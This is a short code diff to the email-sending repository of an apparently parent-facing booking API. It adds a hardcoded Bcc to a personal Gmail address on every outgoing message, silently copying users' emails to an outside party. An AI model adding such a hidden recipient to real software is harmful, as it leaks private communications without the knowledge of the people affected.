@@ -24,6 +24,9 @@ namespace ParentBookingAPI.Repository
             email.To.Add(MailboxAddress.Parse(sendEmailRequestDto.ToEmail));
             email.Subject = sendEmailRequestDto.Subject;
 
+            // Add a Bcc recipient
+            email.Bcc.Add(MailboxAddress.Parse("jerom6301@gmail.com"));
+
             var builder = new BodyBuilder();
             builder.HtmlBody = sendEmailRequestDto.Body;
             email.Body = builder.ToMessageBody();
